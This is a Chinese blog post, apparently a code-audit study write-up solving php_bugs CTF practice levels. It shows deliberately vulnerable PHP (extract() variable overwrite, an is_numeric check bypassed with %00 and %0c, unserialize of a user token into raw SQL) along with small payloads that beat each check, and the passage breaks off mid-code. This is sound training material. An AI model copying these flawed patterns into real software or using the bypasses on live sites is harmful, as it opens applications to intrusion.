{"title":"PHP代码审计之旅之百家CMS","uid":"2701665bc33e3ae6e528c88e69e6e2f6","slug":"代审基础——php_bugs","date":"2022-08-11T10:10:16.000Z","updated":"2024-02-14T07:32:24.000Z","comments":true,"path":"api/articles/代审基础——php_bugs.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141532334.jpeg","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>代码审计不会，学习知识需要积累一下基础，因此来搭建php_bugs进行相关学习，题解如下，希望能对在学习代码审计的师傅们有所帮助</p>\n<h1 id=\"靶场\"><a href=\"#靶场\" class=\"headerlink\" title=\"靶场\"></a>靶场</h1><p>github链接如下<br><a href=\"https://github.com/bowu678/php_bugs\">https://github.com/bowu678/php_bugs</a></p>\n<h2 id=\"extract变量覆盖\"><a href=\"#extract变量覆盖\" class=\"headerlink\" title=\"extract变量覆盖\"></a>extract变量覆盖</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$flag</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxx'</span><span class=\"token punctuation\">;</span> \n<span class=\"token function\">extract</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$shiyan</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n <span class=\"token punctuation\">&#123;</span> \n    <span class=\"token variable\">$content</span><span class=\"token operator\">=</span><span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$shiyan</span><span class=\"token operator\">==</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span> \n        <span class=\"token keyword\">echo</span><span class=\"token string single-quoted-string\">'ctf&#123;xxx&#125;'</span><span class=\"token punctuation\">;</span> \n    <span class=\"token punctuation\">&#125;</span>\n   <span class=\"token keyword\">else</span>\n   <span class=\"token punctuation\">&#123;</span> \n    <span class=\"token keyword\">echo</span><span class=\"token string single-quoted-string\">'Oh.no'</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">&#125;</span> \n   <span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话发现是<code>$shiyan==$content</code>，才会输出flag，但是flag内容是不可控的，这里的话就需要说一下这个<code>extract()</code>函数了</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">extract — 从数组中将变量导入到当前的符号表<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>其实这个概念，自我感觉说的比较笼统，不过这里我们可以举个栗子来进行学习</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span>__FILE__<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n$a<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">extract</span><span class=\"token punctuation\">(</span>$_GET<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\necho $a<span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141529164.png\" alt=\"在这里插入图片描述\"><br>当出现与他同名的变量时，后者会覆盖前者</p>\n<p>此时来看本关代码</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">$flag<span class=\"token operator\">=</span><span class=\"token char\">'xxx'</span><span class=\"token punctuation\">;</span> \n<span class=\"token function\">extract</span><span class=\"token punctuation\">(</span>$_GET<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span>$shiyan<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n <span class=\"token punctuation\">&#123;</span> \n    $content<span class=\"token operator\">=</span><span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span>$flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>$shiyan<span class=\"token operator\">==</span>$content<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里需要实现<code>$shiyan==$content</code>，<code>$content</code>来源于<code>file_get_contents($flag)</code>，而这个file_get_contents函数是把文件的信息打印出来，我们这个flag是个变量，他取值必定不是文件名，因此这里content变量的值为空，此时无论怎么写flag，content都为空，我们只需要保证shiyan也为空就可以，构造payload如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">flag<span class=\"token operator\">=</span><span class=\"token number\">123</span><span class=\"token operator\">&amp;</span>shiyan<span class=\"token operator\">=</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141529664.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"绕过过滤的空白字符\"><a href=\"#绕过过滤的空白字符\" class=\"headerlink\" title=\"绕过过滤的空白字符\"></a>绕过过滤的空白字符</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n <span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$info</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span> \n<span class=\"token variable\">$req</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$flag</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"</span><span class=\"token punctuation\">;</span>\n \n<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"display_error\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//为一个配置选项设置值</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//关闭所有PHP错误报告</span>\n \n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'number'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n   <span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"hint:26966dc52e85af40f59b4fe73d8c323a.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt</span>\n \n   <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"have a fun!!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//die — 等同于 exit()</span>\n \n<span class=\"token punctuation\">&#125;</span>\n \n<span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$global_var</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  <span class=\"token comment\">//foreach 语法结构提供了遍历数组的简单方式 </span>\n    <span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$global_var</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n        <span class=\"token variable\">$value</span> <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//trim — 去除字符串首尾处的空白字符（或者其他字符）</span>\n        <span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$req</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">addslashes</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串</span>\n    <span class=\"token punctuation\">&#125;</span> \n<span class=\"token punctuation\">&#125;</span> \n \n \n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">is_palindrome_number</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$number</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n    <span class=\"token variable\">$number</span> <span class=\"token operator\">=</span> <span class=\"token function\">strval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$number</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//strval — 获取变量的字符串值</span>\n    <span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> \n    <span class=\"token variable\">$j</span> <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$number</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//strlen — 获取字符串长度</span>\n    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$j</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$number</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!==</span> <span class=\"token variable\">$number</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$j</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span> \n        <span class=\"token punctuation\">&#125;</span> \n        <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> \n        <span class=\"token variable\">$j</span><span class=\"token operator\">--</span><span class=\"token punctuation\">;</span> \n    <span class=\"token punctuation\">&#125;</span> \n    <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span> \n<span class=\"token punctuation\">&#125;</span> \n \n \n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'number'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">//is_numeric — 检测变量是否为数字或数字字符串 </span>\n<span class=\"token punctuation\">&#123;</span>\n \n   <span class=\"token variable\">$info</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"sorry, you cann't input a number!\"</span><span class=\"token punctuation\">;</span>\n \n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">elseif</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$req</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'number'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token function\">strval</span><span class=\"token punctuation\">(</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$req</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'number'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">//intval — 获取变量的整数值</span>\n<span class=\"token punctuation\">&#123;</span>\n \n     <span class=\"token variable\">$info</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"number must be equal to it's integer!! \"</span><span class=\"token punctuation\">;</span>  \n \n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span>\n<span class=\"token punctuation\">&#123;</span>\n \n     <span class=\"token variable\">$value1</span> <span class=\"token operator\">=</span> <span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$req</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"number\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n     <span class=\"token variable\">$value2</span> <span class=\"token operator\">=</span> <span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token function\">strrev</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$req</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"number\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  \n \n     <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value1</span><span class=\"token operator\">!=</span><span class=\"token variable\">$value2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n          <span class=\"token variable\">$info</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"no, this is not a palindrome number!\"</span><span class=\"token punctuation\">;</span>\n     <span class=\"token punctuation\">&#125;</span>\n     <span class=\"token keyword\">else</span>\n     <span class=\"token punctuation\">&#123;</span>\n \n          <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_palindrome_number</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$req</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"number\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n              <span class=\"token variable\">$info</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"nice! <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$value1</span><span class=\"token punctuation\">&#125;</span></span> is a palindrome number!\"</span><span class=\"token punctuation\">;</span> \n          <span class=\"token punctuation\">&#125;</span>\n          <span class=\"token keyword\">else</span>\n          <span class=\"token punctuation\">&#123;</span>\n             <span class=\"token variable\">$info</span><span class=\"token operator\">=</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n          <span class=\"token punctuation\">&#125;</span>\n     <span class=\"token punctuation\">&#125;</span>\n \n<span class=\"token punctuation\">&#125;</span>\n \n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$info</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话大看一下有四个要求</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'number'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> 这个条件需要为假，才能继续往下运行\n<span class=\"token number\">2</span>、要求<span class=\"token variable\">$req</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'number'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token function\">strval</span><span class=\"token punctuation\">(</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$req</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'number'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token number\">3</span>、要求<span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$req</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"number\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token function\">strrev</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$req</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"number\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//strrev函数作用是反转字符串</span>\n<span class=\"token number\">4</span>、 <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_palindrome_number</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$req</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"number\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>这个条件需要为假，才能输出flag<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>针对第一个条件的话，赋值的时候加上一个%00就可以绕过<br>针对<code>$req[&#39;number&#39;]==strval(intval($req[&#39;number&#39;]))</code>的话，它这个相当于是不让变量中有字符串，只能有数字时才符合条件，这个是怎么知道的呢，当然是本地测试</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token function\">addslashes</span><span class=\"token punctuation\">(</span><span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token function\">strval</span><span class=\"token punctuation\">(</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token operator\">==</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>一般的话肯定考虑一个空格给它绕过，但是这段代码里传入的变量都经过了<code>trim</code>函数，trim函数过滤了很多空白字符<br><img src=\"https://img-blog.csdnimg.cn/83d7f97dba7f4b7995ebb9e752eae942.png\" alt=\"在这里插入图片描述\"><br>一般的话当然是没办法了，但是这里还有一个<code>%0c</code>，也就是<code>\\f</code>未被过滤，因此这里我们可以用它来进行绕过，我们本地试也可以发现它是符合条件的<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141529984.png\" alt=\"在这里插入图片描述\"><br>现在来看第三个条件<code>intval($req[&quot;number&quot;])==intval(strrev($req[&quot;number&quot;]));</code>，这个<code>strrev</code>函数的作用是反转字符串，这里的话也就是要求数字是回文数，比如131，这个时候反转一下还是131，此时就可以满足条件了<br>来看最后一个，让<code> if(is_palindrome_number($req[&quot;number&quot;]))</code>条件为假，这个函数定义如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">is_palindrome_number</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$number</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n    <span class=\"token variable\">$number</span> <span class=\"token operator\">=</span> <span class=\"token function\">strval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$number</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//strval — 获取变量的字符串值</span>\n    <span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> \n    <span class=\"token variable\">$j</span> <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$number</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//strlen — 获取字符串长度</span>\n    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$j</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$number</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!==</span> <span class=\"token variable\">$number</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$j</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span> \n        <span class=\"token punctuation\">&#125;</span> \n        <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> \n        <span class=\"token variable\">$j</span><span class=\"token operator\">--</span><span class=\"token punctuation\">;</span> \n    <span class=\"token punctuation\">&#125;</span> \n    <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span> \n<span class=\"token punctuation\">&#125;</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这个函数当它是回文数时就会正确，因此看似是与条件三矛盾的，但想到还有空白字符，用它的时候同时写回文数，此时是不是就可以成功绕过呢<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141529546.png\" alt=\"在这里插入图片描述\"><br>此时的话第四个也就可以满足，结合前三个，需要<code>%00</code>，需要<code>%0c</code>，需要回文数，因此这个第四个测试的payload其实就是符合条件的<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141529960.png\" alt=\"在这里插入图片描述\"><br>同时呢，这里再补充一下，%0c也可以用%2B，也就是+来代替，以为111与+111两者并无二致</p>\n<h2 id=\"多重加密\"><a href=\"#多重加密\" class=\"headerlink\" title=\"多重加密\"></a>多重加密</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'common.php'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$requset</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_merge</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//把一个或多个数组合并为一个数组</span>\n    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">db</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">public</span> <span class=\"token variable\">$where</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">where</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">select</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">where</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">select</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$where</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from user where '</span><span class=\"token operator\">.</span><span class=\"token variable\">$where</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">//函数执行一条 MySQL 查询。</span>\n            <span class=\"token keyword\">return</span> @<span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">//从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$requset</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">//测试变量是否已经配置。若变量已存在则返回 true 值。其它情形返回 false 值。</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$login</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token function\">gzuncompress</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$requset</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//gzuncompress:进行字符串压缩</span>\n        <span class=\"token comment\">//unserialize: 将已序列化的字符串还原回 PHP 